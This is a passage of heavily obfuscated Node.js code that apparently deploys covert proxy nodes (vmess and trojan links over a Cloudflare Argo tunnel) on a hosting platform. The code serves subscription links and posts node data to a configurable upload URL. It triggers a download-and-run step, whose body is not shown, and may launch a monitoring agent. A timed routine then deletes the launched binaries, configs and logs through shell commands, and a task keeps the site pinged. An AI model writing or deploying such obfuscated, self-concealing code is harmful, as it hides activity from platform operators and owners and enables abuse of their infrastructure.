_0x12f377=_0x1f98,_0x5089de={'v':'2','ps':''+_0xaf9be1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x12f377(_0x42549d._0x45943c),'net':'ws','type':_0x12f377(_0x42549d._0x174ae0),'host':_0x4d9178,'path':'/vmess-argo?ed=2560','tls':_0x12f377(0x132),'sni':_0x4d9178,'alpn':'','fp':_0x12f377(0x12e)},_0x3f6f77=_0x12f377(0x9c)+UUID+'@'+CFIP+':'+CFPORT+_0x12f377(_0x42549d._0x3ce418)+_0x4d9178+_0x12f377(0xaf)+_0x4d9178+_0x12f377(_0x42549d._0x40b72a)+_0xaf9be1+_0x12f377(_0x42549d._0x5cfd4c)+Buffer['from'](JSON[_0x12f377(0xa4)](_0x5089de))[_0x12f377(_0x42549d._0x47fa5e)](_0x12f377(_0x42549d._0x27cea9))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x12f377(0x100)+_0x4d9178+'&fp=firefox&type=ws&host='+_0x4d9178+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0xaf9be1+'\x0a\x20\x20\x20\x20';console[_0x12f377(_0x42549d._0x1ce315)](Buffer[_0x12f377(0xcb)](_0x3f6f77)['toString'](_0x12f377(0x12c))),fs['writeFileSync'](subPath,Buffer[_0x12f377(_0x42549d._0x7b20e6)](_0x3f6f77)['toString'](_0x12f377(0x12c))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2ffd6a,_0x292e56)=>{const _0x1e0155=_0x12f377,_0x5d7603=Buffer[_0x1e0155(0xcb)](_0x3f6f77)[_0x1e0155(_0x5c89c8._0x4516d4)](_0x1e0155(0x12c));_0x292e56[_0x1e0155(0xd0)](_0x1e0155(_0x5c89c8._0x5cfea4),'text/plain;\x20charset=utf-8'),_0x292e56[_0x1e0155(_0x5c89c8._0x2239ce)](_0x5d7603);}),_0x3a21e8(_0x3f6f77);},0x7d0);});}}async function uploadNodes(){const _0x57cc1e={_0x135465:0xb7,_0x404a7e:0x12d,_0x1cfc7a:0xb3,_0x594b71:0xc2,_0x228412:0xb4,_0x53ac67:0x131,_0x11e3b3:0x8c,_0x5ecc68:0xe6,_0x3b9791:0xa7,_0x45127f:0xcd,_0x545e54:0xb3,_0x323072:0xc2},_0x5032d7=_0x5a7c31;if(UPLOAD_URL&&PROJECT_URL){const _0x194eb3=PROJECT_URL+'/'+SUB_PATH,_0x284ab9={'subscription':[_0x194eb3]};try{const _0x12cb6f=await axios[_0x5032d7(_0x57cc1e._0x135465)](UPLOAD_URL+'/api/add-subscriptions',_0x284ab9,{'headers':{'Content-Type':_0x5032d7(_0x57cc1e._0x404a7e)}});return _0x12cb6f&&_0x12cb6f[_0x5032d7(_0x57cc1e._0x1cfc7a)]===0xc8?(console[_0x5032d7(_0x57cc1e._0x594b71)](_0x5032d7(0x95)),_0x12cb6f):null;}catch(_0x343732){if(_0x343732[_0x5032d7(_0x57cc1e._0x228412)]){if(_0x343732[_0x5032d7(0xb4)][_0x5032d7(_0x57cc1e._0x1cfc7a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5032d7(_0x57cc1e._0x53ac67)](listPath))return;const _0x387e3f=fs[_0x5032d7(0x129)](listPath,_0x5032d7(_0x57cc1e._0x11e3b3)),_0x4b43b5=_0x387e3f[_0x5032d7(_0x57cc1e._0x5ecc68)]('\x0a')[_0x5032d7(_0x57cc1e._0x3b9791)](_0x31cb85=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5032d7(0x109)](_0x31cb85));if(_0x4b43b5[_0x5032d7(_0x57cc1e._0x45127f)]===0x0)return;const _0x282cf6=JSON[_0x5032d7(0xa4)]({'nodes':_0x4b43b5});try{const _0x1a9d82=await axios['post'](UPLOAD_URL+_0x5032d7(0x89),_0x282cf6,{'headers':{'Content-Type':_0x5032d7(0x12d)}});return _0x1a9d82&&_0x1a9d82[_0x5032d7(_0x57cc1e._0x545e54)]===0xc8?(console[_0x5032d7(_0x57cc1e._0x323072)](_0x5032d7(0x126)),_0x1a9d82):null;}catch(_0x1db856){return null;}}else return;}}function cleanFiles(){const _0x5b9158={_0x199a52:0xee},_0x2b35ab={_0x2c5ad1:0x98};setTimeout(()=>{const _0x22afa6=_0x1f98,_0x2de6c6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2de6c6['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2de6c6[_0x22afa6(_0x5b9158._0x199a52)](phpPath);process[_0x22afa6(0x10b)]==='win32'?exec(_0x22afa6(0xde)+_0x2de6c6[_0x22afa6(0x128)]('\x20')+'\x20>\x20nul\x202>&1',_0x1795fe=>{const _0x5eb098=_0x22afa6;console[_0x5eb098(_0x2b35ab._0x2c5ad1)](),console[_0x5eb098(0xc2)](_0x5eb098(0xe2)),console[_0x5eb098(0xc2)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x22afa6(0xbc)+_0x2de6c6['join']('\x20')+_0x22afa6(0xb6),_0x5e28b9=>{const _0x24dee1=_0x22afa6;console[_0x24dee1(0x98)](),console['log'](_0x24dee1(0xe2)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x10ea51={_0x4d6b20:0xb2,_0x1c18e2:0x90,_0xc246da:0xdc},_0x5c8423=_0x5a7c31;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5c8423(0xc2)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xb8b0dd=await axios['post'](_0x5c8423(_0x10ea51._0x4d6b20),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5c8423(0x12d)}});return console['log'](_0x5c8423(_0x10ea51._0x1c18e2)),_0xb8b0dd;}catch(_0x1ff218){return console[_0x5c8423(_0x10ea51._0xc246da)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1ff218['message']),null;}}async function startserver(){const _0x3da823={_0x2aef43:0xec},_0x15f3c3=_0x5a7c31;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x493350){console['error'](_0x15f3c3(_0x3da823._0x2aef43),_0x493350);}}startserver()[_0x5a7c31(0x103)](_0x4a4f21=>{const _0x1fc6d0={_0x1b93a5:0xe7},_0x5c8026=_0x5a7c31;console[_0x5c8026(0xdc)](_0x5c8026(_0x1fc6d0._0x1b93a5),_0x4a4f21);}),app[_0x5a7c31(0x130)]('/',async function(_0xc10297,_0xa1e20f){const _0x533a7b={_0x307fd4:0xca,_0xf7c37a:0xf6,_0x344ce6:0x84},_0x1f9938=_0x5a7c31;try{const _0xe22165=path[_0x1f9938(0x128)](__dirname,'index.html'),_0x4150a1=await fs['promises'][_0x1f9938(_0x533a7b._0x307fd4)](_0xe22165,_0x1f9938(_0x533a7b._0xf7c37a));_0xa1e20f[_0x1f9938(_0x533a7b._0x344ce6)](_0x4150a1);}catch(_0x23f7e0){_0xa1e20f['send'](_0x1f9938(0x7f));}}),app[_0x5a7c31(0xd5)](PORT,()=>console['log'](_0x5a7c31(0xc9)+PORT+'!'));
